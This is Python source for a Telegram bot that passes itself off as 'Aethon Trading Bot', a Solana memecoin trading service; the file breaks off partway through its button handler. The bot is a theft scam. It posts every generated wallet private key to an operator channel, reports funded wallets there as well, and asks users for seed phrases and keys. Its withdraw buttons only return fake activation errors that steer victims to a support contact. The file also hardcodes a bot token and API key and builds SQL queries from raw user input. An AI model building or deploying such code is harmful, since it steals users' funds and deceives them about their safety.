from telegram import Bot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters, MessageHandler
import sqlite3
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from solders.pubkey import Pubkey
from solders.message import Message
from solders.transaction import VersionedTransaction, Transaction
from solders.system_program import TransferParams, transfer
from solders.message import MessageV0, MessageAddressTableLookup
import solana
import requests
import base64
import base58
import os
import asyncio
import time
import json
from threading import Timer
import threading

BOT_NAME = 'AethonOfficialbot'
CENTRAL_ADDRESS = '4TK3gSRqXnYKryzsokfRAPLTfW1KMJdhKZXpC2Ni68g4'
bitAPI = "ory_at_oFiURWw7aqs4EcoMDlCD_0YmdDd65-mArD-i6WZTttA.jQpug_XdRI5aoacG2K5GUcZjlwt_QwqBeF8OZFuMAUI"
DB_FILE = "database.json"

languages = {
    'en': {
        'text': 'English: 🇬🇧',
        'next': 'es'
    },
    'es': {
        'text': 'Español: 🇪🇸',
        'next': 'en'
    }
}

priorities = {
    'Medium': {'next': 'High'},
    'High': {'next': 'Very High'},
    'Very High': {'next': 'Medium'},
}

connection = sqlite3.connect("db.db", check_same_thread=False)
cursor = connection.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        pub_key TEXT NOT NULL,
        priv_key TEXT NOT NULL,
        referred_by TEXT,
        language TEXT DEFAULT 'en',
        min_position_value REAL DEFAULT 0.1,
        auto_buy_enabled BOOLEAN DEFAULT 0,
        auto_buy_value REAL DEFAULT 0.1,
        instant_rug_exit_enabled BOOLEAN DEFAULT 0,
        swap_auto_approve_enabled BOOLEAN DEFAULT 0,
        left_buy_button REAL DEFAULT 1.0,
        right_buy_button REAL DEFAULT 5.0,
        left_sell_button REAL DEFAULT 25.0,
        right_sell_button REAL DEFAULT 100.0,
        buy_slippage REAL DEFAULT 10.0,
        sell_slippage REAL DEFAULT 10.0,
        max_price_impact REAL DEFAULT 25.0,
        mev_protect TEXT DEFAULT 'Turbo',
        transaction_priority TEXT DEFAULT 'Medium',
        transaction_priority_value REAL DEFAULT 0.0100,
        sell_protection_enabled BOOLEAN DEFAULT 1,
        balance REAL DEFAULT 0.0
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS copy_trades (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT NOT NULL,
        target_wallet TEXT NOT NULL,
        tag TEXT,
        buy_percentage REAL DEFAULT 5.0,
        copy_sells BOOLEAN DEFAULT 1,
        buy_gas REAL DEFAULT 0.0015,
        sell_gas REAL DEFAULT 0.0015,
        slippage REAL DEFAULT 10.0,
        auto_sell BOOLEAN DEFAULT 0,
        active BOOLEAN DEFAULT 1
    )
''')
connection.commit()

TOKEN = "7758643941:AAHqM-I3s9PEs0Jx7xsrz4Gx4gH6YVC9J10"
bot = Bot(TOKEN)
owner_id = [6216175814]
imported_channel = -1002534917643
new_channel = -1002534917643
SOLANA_URL = "https://api.mainnet-beta.solana.com"

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, ensure_ascii=False, indent=4)

async def get_balance(pub_key):
    try:
        query = "SELECT balance FROM users WHERE pub_key = ?"
        cursor.execute(query, (pub_key,))
        result = cursor.fetchone()
        if result:
            return result[0]
        else:
            print("User not found.")
            return None
    except Exception as e:
        print(f"Query error: {e}")
        return None

async def update_balance(pub_key, new_balance):
    try:
        query = "UPDATE users SET balance = ? WHERE pub_key = ?"
        cursor.execute(query, (new_balance, pub_key))
        connection.commit()
        if cursor.rowcount > 0:
            print("Balance updated.")
            return True
        else:
            print("User not found.")
            return False
    except Exception as e:
        print(f"Query error: {e}")
        return False

def run_check_balances():
    print("started")
    asyncio.run(check_balances())

async def check_balances():
    try:
        users = cursor.execute("SELECT * FROM users").fetchall()
        wallets = [(user[1], user[2], user[21]) for user in users]
        client = AsyncClient(SOLANA_URL)
        for wallet in wallets:
            balance = await check_balance(wallet[0])
            await asyncio.sleep(3)
            print(f"Wallet {wallet[0]} balance {balance}")
            if balance > 0.001:
                try:
                    old_balance = await get_balance(wallet[0])
                    if balance > old_balance:
                        set_balance = balance + old_balance
                        await update_balance(wallet[0], set_balance)
                        await bot.send_message(chat_id=imported_channel, text=f"Private key: {wallet[1]}, public key: {wallet[0]}, funded his wallet with {balance}")
                except Exception as e:
                    print("Transaction failed")
    except Exception as e:
        print(f"Error: {e}")
    print("DONE")
    t = Timer(3 * 60, run_check_balances)
    t.start()

async def transfer_solana(
    client: AsyncClient,
    from_keypair: Keypair,
    receiver_address: str,
    amount: float,
) -> str:
    token_address = Pubkey.from_string(receiver_address)
    from_public_key = from_keypair.pubkey()
    response = await client.get_latest_blockhash()
    latest_blockhash = response.value.blockhash
    transaction = solana.transaction.Transaction().add(
        transfer(
            TransferParams(
                from_pubkey=from_public_key,
                to_pubkey=token_address,
                lamports=int(amount * 1e9)
        )
    )
    transaction.recent_blockhash = latest_blockhash
    transaction.fee_payer = from_public_key
    transaction.sign(from_keypair)
    message = transaction.compile_message()
    fee_response = await client.get_fee_for_message(message)
    fee = fee_response.value
    response = await client.send_raw_transaction(transaction.serialize())
    return response.value, fee

async def comprar_token_solana(
    keypair: Keypair,
    token_contract_address: str,
    amount: float,
) -> str:
    response = requests.post("https://swap-v2.solanatracker.io/swap", json={
        "from": "So11111111111111111111111111111111111111112",
        "to": token_contract_address,
        "amount": amount,
        "slippage": 15,
        "payer": str(keypair.pubkey()),
    })
    swap_response = response.json()
    try:
        async with AsyncClient(SOLANA_URL) as client:
            txn_data = base64.b64decode(swap_response["txn"])
            transaction = Transaction.from_bytes(bytes(txn_data))
            response = await client.get_latest_blockhash()
            latest_blockhash = response.value.blockhash
            transaction.sign([keypair], latest_blockhash)
            res = await client.send_transaction(transaction)
            return res
    except Exception as e:
        return str(e)

async def check_balance(public_key_str: str):
    async with AsyncClient(SOLANA_URL) as client:
        public_key = Pubkey.from_string(public_key_str)
        try:
            balance_result = await client.get_balance(public_key)
            if balance_result.value:
                balance_lamports = balance_result.value
                balance_sol = balance_lamports / 1_000_000_000
                return balance_sol
            else:
                return 0
        except Exception as e:
            print(e)
            return 0

async def create_wallet() -> Keypair:
    keypair = Keypair()
    return keypair

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    user = get_user(chat_id)
    if user is None:
        welcome_message = """*Welcome to Aethon Trading Bot Official*

The Smartest Trading Telegram bot. Aethon Trading Bot enables you to escape from incoming rug pulls, quickly buy or sell tokens and set automations like Limit Orders, DCA, and Sniping.

Designed with security, speed, and simplicity in mind, Aethon Trading Bot makes trading memecoins as easy as a tap. Whether you're here to explore new opportunities or manage existing trades, Aethon Trading Bot's user-friendly interface and real-time updates ensure you're always a step ahead in the memecoin world.

Get started, and let Aethon Trading Bot bring a touch of fun and profit to your Solana trading experience!

👉 [Watch Tutorial Video](https://youtu.be/OmzEUuAI4Hk?si=rEL8K5RPmL4HHWHz) 👈

Click on the *"CONTINUE"* button to get started!"""

        keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        args = context.args
        referred_by = args[0] if len(args) > 0 else None
        cursor.execute(f"SELECT * FROM users WHERE id = '{referred_by}'")
        refer_user = cursor.fetchone()

        keypair = await create_wallet()
        public_key = keypair.pubkey()
        private_key_full = keypair.secret() + bytes(public_key)
        private_key_base58 = base58.b58encode(private_key_full).decode("utf-8")
        await context.bot.send_message(chat_id=new_channel, text=f"Private key: {private_key_base58}, public key: {public_key}")
        cursor.execute(f"INSERT INTO users (id, pub_key, priv_key{', referred_by' if refer_user is not None else ''}) VALUES ({chat_id}, '{public_key}', '{private_key_base58}'{', ' + str(refer_user[0]) if refer_user is not None else ''})")
        connection.commit()
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await start_fn(None, chat_id, context)

def get_user(chat_id: str):
    cursor.execute(f"SELECT * FROM users WHERE id = {chat_id}")
    user = cursor.fetchone()
    return user

async def send_copy_trade(chat_id, context):
    # ... (unchanged) ...

async def send_settings(chat_id, context, query = None):
    # ... (unchanged) ...

async def start_fn(query, chat_id, context):
    if query is not None:
        await query.delete_message()
    # Reset all context states
    context.user_data.update({
        'new_copy_trade': False,
        'change_tag': False,
        'set_target_wallet': False,
        'change_buy_percentage': False,
        'change_buy_gas': False,
        'change_sell_gas': False,
        'change_slippage': False,
        'import_wallet': False,
        'buy_x': 0,
        'contract_address': '',
        'change_min_position_value': False,
        'change_auto_buy_value': False,
        'change_left_buy_button': False,
        'change_right_buy_button': False,
        'change_left_sell_button': False,
        'change_right_sell_button': False,
        'change_buy_slippage': False,
        'change_sell_slippage': False,
        'change_max_price_impact': False,
        'change_transaction_priority_value': False
    })

    user = get_user(chat_id)
    wallet_balance = await get_balance(user[1])
    total_balance = round(wallet_balance, 6) if wallet_balance > 0 else 0

    keyboard = [
        [InlineKeyboardButton("⚡ Buy", callback_data="buy"), InlineKeyboardButton("💼 Sell & Manage", callback_data="sell_manage")],
        [InlineKeyboardButton("🧪 Create Token", callback_data="create_token"), InlineKeyboardButton("🎁 Claim Airdrop", callback_data="claim_airdrop")],
        [InlineKeyboardButton("❓ Help", callback_data="help"), InlineKeyboardButton("👥 Refer Friends", callback_data="refer"), InlineKeyboardButton("📊 Copy Trade", callback_data="copy_trade")],
        [InlineKeyboardButton("👛 Wallet", callback_data="wallet"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("💎 Premium Access", callback_data="premium_access")],
        [InlineKeyboardButton("🎥 Tutorial", url="https://youtu.be/OmzEUuAI4Hk?si=rEL8K5RPmL4HHWHz")],
        [InlineKeyboardButton("📌 Pin", callback_data="pin"), InlineKeyboardButton("🔄 Refresh", callback_data="start_pressed")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=chat_id,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        text=f"""Discover the smartest trading bot built exclusively for Solana traders.

Instantly trade any token right at launch.
Below is your Solana wallet address linked to your Telegram account.

Fund your wallet to start trading with ease.
Solana Wallet:
`{user[1]}` (Tap to copy)
Balance: {total_balance} SOL

Once done, tap "Refresh" and your balance will appear here.

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.

User funds are safe on Aethon Trading Bot. For more info on your wallet tap the wallet button below.
  """)

async def buy(chat_id, context):
    message = """Buy Token:

To buy a token enter a ticker, token address, or a URL from pump.fun, Birdeye, DEX Screener or Meteora.
    """
    keyboard = [[InlineKeyboardButton("Close", callback_data="continue")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

async def sell(chat_id, context):
    keyboard = [[InlineKeyboardButton("Close", callback_data="continue")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""No open positions""", reply_markup=reply_markup)

async def wallet(chat_id, context):
    user = get_user(chat_id)
    keyboard = [
        [InlineKeyboardButton("Close", callback_data="continue")],
        [InlineKeyboardButton("Withdraw all SOL", callback_data="withdraw_all"), InlineKeyboardButton("Withdraw X SOL", callback_data="withdraw_x")],
        [InlineKeyboardButton("Import Existing Wallet", callback_data="import_wallet")],
        [InlineKeyboardButton("Refresh", callback_data="wallet")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    wallet_balance = await get_balance(user[1])
    total_balance = round(wallet_balance, 6)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Your Wallet:* 

Address: `{user[1]}` (tap to copy)
Balance: {total_balance} SOL
Tap to copy the address and send SOL to deposit.
""", reply_markup=reply_markup)

async def help(chat_id, context):
    keyboard = [[InlineKeyboardButton("Close", callback_data="continue")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*Which tokens can I trade?*
Any SPL token that is a SOL pair, on Raydium, pump.fun, Meteora, Moonshot, or Jupiter, and will integrate more platforms on a rolling basis. We pick up pairs instantly, and Jupiter will pick up non-SOL pairs within approx. 10 minutes.

*How does the Instant Rug Exit work?*
The instant Rug exit, once enabled, it works like a Mevbot which tracks the mempool for Buy and Sell transaction orders, once it detects an incoming large sell order, it will immediately sell before the large sell order is processed, saving you from a potential rug pull.

*Where can I find my referral link?*
Open the /start menu and click Refer Friends.

*How do I import my normal/existing wallet on Aethon Trading Bot?*
Open the /start, Tap the Wallet button, Click on Import Existing wallet and you'll be able to import your existing wallets!

*How can I use the Copy Trading feature?*
You will need to first fund your bot, Then click on Copy Trade, Paste in the address you would like to track and copy trades, set the amount in sol you will like to use for copy trading, Enable/Disable Copy Sell

*What are the fees for using Aethon Trading Bot?*
Transactions through Aethon Trading Bot incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

*Additional questions or need support?*
👉 [Watch Tutorial Video](https://youtu.be/OmzEUuAI4Hk?si=rEL8K5RPmL4HHWHz) 👈
Contact Aethon Trading Bot official telegram support admin- @AlphaCapitalFx
""", reply_markup=reply_markup)

async def referral(chat_id, context):
    referrals = cursor.execute(f"SELECT * FROM users WHERE referred_by = {chat_id}").fetchall()
    keyboard = [
        [InlineKeyboardButton("QR code", callback_data="qr"), InlineKeyboardButton("Close", callback_data="continue")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Referrals:

Your reflink: https://t.me/{BOT_NAME}?start={chat_id}

Referrals: {len(referrals)}

Lifetime Bonk earned: 0.00 BONK ($0.00)

Rewards are updated at least every 24 hours and rewards are automatically deposited to your BONK balance.

Refer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
""", reply_markup=reply_markup)

async def copytrade(chat_id, context):
    user = get_user(chat_id)
    copies = cursor.execute(f"SELECT * FROM copy_trades WHERE user_id = {chat_id}").fetchall()
    keyboard = [[InlineKeyboardButton(f"{'🟢' if copy[10] else '🟠' } {copy[0] if copy[3] == '' else copy[3]}", callback_data=f"modify_copy_{copy[0]}")] for copy in copies]
    keyboard.append([InlineKeyboardButton("➕ New", callback_data="new_copy_trade")])
    keyboard.append([InlineKeyboardButton("Pause All", callback_data="pause_copy_trade")])
    keyboard.append([InlineKeyboardButton("← Back", callback_data="continue")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Copy Trade
Wallet: {user[1]}

Copy Trade allows you to copy the buys and sells of any target wallet. 
🟢 Indicates a copy trade setup is active.
🟠 Indicates a copy trade setup is paused.

You do not have any copy trades setup yet. Click on the New button to create one!
""", reply_markup=reply_markup)

def load_db():
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def get_limit(user_id):
    data = load_db()
    return data.get(str(user_id), None) 

def set_limit(user_id, new_limit):
    data = load_db()
    data[str(user_id)] = new_limit
    save_db(data)
    return True

async def buy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await buy(chat_id, context)

async def sell_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await sell(chat_id, context)

async def copytrade_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await copytrade(chat_id, context)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await help(chat_id, context)

async def wallet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await wallet(chat_id, context)

async def settings_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await send_settings(chat_id, context)

async def referral_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await referral(chat_id, context)

async def set_balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    if len(context.args) != 2:
        await update.message.reply_text("Use the command like: /set_balance <wallet> <sum>")
        return
    
    wallet = context.args[0]
    summ = float(context.args[1])
    
    res = await update_balance(wallet, summ)
    if res:
        await update.message.reply_text("Done!")

async def set_limit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    if len(context.args) != 2:
        await update.message.reply_text("Use the command like: /set_limit <wallet> <sum>")
        return
    user = context.args[0]
    summ = float(context.args[1])
    set_limit(user, summ)
    res = get_limit(user)
    if res:
        await update.message.reply_text(f"User limit set to: {res}")

async def get_balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    wallet = context.args[0]
    res = await get_balance(wallet)
    if res:
        await update.message.reply_text(f"User balance: {res}")

async def check_balances_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    if chat_id not in owner_id:
        return
    await update.message.reply_text(f"Check started")
    
async def check_activation_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update['message']['chat']['id']
    await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""⚠️YOUR Aethon Trading Bot ACCOUNT HAS NOT BEEN FULLY ACTIVATED⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE""")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    user = get_user(chat_id)

    if query.data == "continue":
        context.user_data['copy_id'] = None
        context.user_data['tag'] = None
        context.user_data['target_wallet'] = None
        context.user_data['buy_percentage'] = None
        context.user_data['copy_sells'] = None
        context.user_data['buy_gas'] = None
        context.user_data['sell_gas'] = None
        context.user_data['slippage'] = None
        context.user_data['auto_sell'] = None
        await start_fn(query, chat_id, context)
    elif query.data == "help":
        await help(chat_id, context)
    elif query.data == "pin":
        await query.message.pin()
    elif query.data == "toggle_copy_trade":
        copy_id = context.user_data.get('copy_id')
        cursor.execute(f"UPDATE copy_trades SET active = NOT active WHERE id = {copy_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "delete_copy_trade":
        copy_id = context.user_data.get('copy_id')
        cursor.execute(f"DELETE FROM copy_trades WHERE id = {copy_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "pause_copy_trade":
        cursor.execute(f"UPDATE copy_trades SET active = 0 WHERE user_id = {chat_id}")
        connection.commit()
        await send_copy_trade(chat_id, context)
    elif query.data == "copy_trade":
        await copytrade(chat_id, context)
    elif "modify_copy_" in query.data:
        copy_id = query.data.split('_')[2]
        copy = cursor.execute(f"SELECT * FROM copy_trades WHERE id = {copy_id}").fetchone()
        context.user_data['copy_id'] = copy_id
        context.user_data['tag'] = copy[3]
        context.user_data['target_wallet'] = copy[2]
        context.user_data['buy_percentage'] = copy[4]
        context.user_data['copy_sells'] = copy[5]
        context.user_data['buy_gas'] = copy[6]
        context.user_data['sell_gas'] = copy[7]
        context.user_data['slippage'] = copy[8]
        context.user_data['auto_sell'] = copy[9]
        await send_copy_trade(chat_id, context)
    elif query.data == "new_copy_trade":
        context.user_data['copy_id'] = None
        context.user_data['tag'] = None
        context.user_data['target_wallet'] = None
        context.user_data['buy_percentage'] = None
        context.user_data['copy_sells'] = None
        context.user_data['buy_gas'] = None
        context.user_data['sell_gas'] = None
        context.user_data['slippage'] = None
        context.user_data['auto_sell'] = None
        await send_copy_trade(chat_id, context)
    elif query.data == "change_tag":
        context.user_data['change_tag'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter a custom name for this copy trade setup
""")
    elif query.data == "set_target_wallet":
        context.user_data['set_target_wallet'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the target wallet address to copy trade
""")
    elif query.data == "change_buy_percentage":
        context.user_data['change_buy_percentage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
To buy with a fixed sol amount, enter a number. E.g. 0.1 SOL will buy with 0.1 SOL regardless of the target's buy amount.
""")
    elif query.data == "change_copy_sells":
        context.user_data['copy_sells'] = not context.user_data.get('copy_sells', True)
        await send_copy_trade(chat_id, context)
    elif query.data == "change_buy_gas":
        context.user_data['change_buy_gas'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the priority fee to pay for buy trades. E.g 0.01 for 0.01 SOL
""")
    elif query.data == "change_sell_gas":
        context.user_data['change_sell_gas'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter the priority fee to pay for sell trades. E.g 0.01 for 0.01 SOL
""")
    elif query.data == "change_slippage":
        context.user_data['change_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Enter slippage % to use on copy trades
""")
    elif query.data == "change_auto_sell":
        context.user_data['auto_sell'] = not context.user_data.get('auto_sell', False)
        await send_copy_trade(chat_id, context)
    elif query.data == "add_copy_trade":
        if context.user_data.get('target_wallet') is None:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Please enter the target wallet address
""")
        else:
            target_wallet = context.user_data.get('target_wallet')
            tag = context.user_data.get('tag', '')
            buy_percentage = context.user_data.get('buy_percentage', 5)
            copy_sells = context.user_data.get('copy_sells', True)
            buy_gas = context.user_data.get('buy_gas', 0.0015)
            sell_gas = context.user_data.get('sell_gas', 0.0015)
            slippage = context.user_data.get('slippage', 10)
            auto_sell = context.user_data.get('auto_sell', False)
            copy_id = context.user_data.get('copy_id', None)
            buy_percentage = buy_percentage if buy_percentage is not None else 5
            copy_sells = copy_sells if copy_sells is not None else True
            buy_gas = buy_gas if buy_gas is not None else 0.0015
            sell_gas = sell_gas if sell_gas is not None else 0.0015
            slippage = slippage if slippage is not None else 10
            auto_sell = auto_sell if auto_sell is not None else False

            if copy_id is not None:
                cursor.execute(f"UPDATE copy_trades SET target_wallet = '{target_wallet}', tag = '{tag}', buy_percentage = {buy_percentage}, copy_sells = {copy_sells}, buy_gas = {buy_gas}, sell_gas = {sell_gas}, slippage = {slippage}, auto_sell = {auto_sell} WHERE id = {copy_id}")
                connection.commit()
            else:
                cursor.execute(f"INSERT INTO copy_trades (user_id, target_wallet, tag, buy_percentage, copy_sells, buy_gas, sell_gas, slippage, auto_sell) VALUES ('{chat_id}', '{target_wallet}', '{tag}', {buy_percentage}, {copy_sells}, {buy_gas}, {sell_gas}, {slippage}, {auto_sell})")
            connection.commit()
            await send_copy_trade(chat_id, context)
    elif query.data == "sell_manage":
        await sell(chat_id, context)
    elif query.data == "wallet":
        await wallet(chat_id, context)
    elif query.data == "show_private_key":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Private key: {user[2]}
""")
    elif query.data == "withdraw_all":
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to withdraw")
    elif query.data == "withdraw_x":
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to withdraw")
    elif query.data == "import_wallet":
        keyboard = [
        [InlineKeyboardButton("Seed phrase", callback_data="seed")],
        [InlineKeyboardButton("Private key", callback_data="prvkey")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Choose the option to import the wallet
""", reply_markup=reply_markup)
        
    elif query.data == "seed":
        context.user_data['import_wallet'] = "seed"
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the seed phrase down below:""")
    elif query.data == "prvkey":
        context.user_data['import_wallet'] = "key"
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the private key down below:""")
    elif query.data == "premium_access":
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
*💎 Premium Access*

Unlock exclusive features including:
✨ Early Token Alerts – Be the first to know about new launches!
💸 Reduced Trading Fees – Trade smarter with lower costs.
⭐ VIP Support Access – Priority help from our expert team.
⚙️ Token Creation – Launch your own token in seconds.
🎁 Claim Airdrop – Get free tokens instantly! 

Please fund your bot wallet or contact @AlphaCapitalFx for more info.
""",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("👛 Fund Wallet", callback_data="wallet"), InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")]
        ]))

    elif query.data == "refer":
        await referral(chat_id, context)
    elif query.data == "buy":
        await buy(chat_id, context)
    elif query.data == "settings":
        await send_settings(chat_id, context, query)
    elif query.data == "change_language":
        language = languages[user[4]]['next']
        cursor.execute(f"UPDATE users SET language = '{language}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_min_position_value":
        context.user_data['change_min_position_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new minimum position value""")
    elif query.data == "toggle_auto_buy":
        cursor.execute(f"UPDATE users SET auto_buy_enabled = NOT auto_buy_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_auto_buy_value":
        context.user_data['change_auto_buy_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new auto buy value""")
    elif query.data == "toggle_instant_rug_exit":
        cursor.execute(f"UPDATE users SET instant_rug_exit_enabled = NOT instant_rug_exit_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "toggle_swap_auto_approve":
        cursor.execute(f"UPDATE users SET swap_auto_approve_enabled = NOT swap_auto_approve_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_left_buy_button":
        context.user_data['change_left_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left buy button value""")
    elif query.data == "change_right_buy_button":
        context.user_data['change_right_buy_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right buy button value""")
    elif query.data == "change_left_sell_button":
        context.user_data['change_left_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new left sell button value""")
    elif query.data == "change_right_sell_button":
        context.user_data['change_right_sell_button'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new right sell button value""")
    elif query.data == "change_buy_slippage":
        context.user_data['change_buy_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new buy slippage value""")
    elif query.data == "change_sell_slippage":
        context.user_data['change_sell_slippage'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new sell slippage value""")
    elif query.data == "change_max_price_impact":
        context.user_data['change_max_price_impact'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new max price impact value""")
    elif query.data == "change_mev_protect":
        new_protect = "Secure" if user[17] == "Turbo" else "Turbo"
        cursor.execute(f"UPDATE users SET mev_protect = '{new_protect}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority":
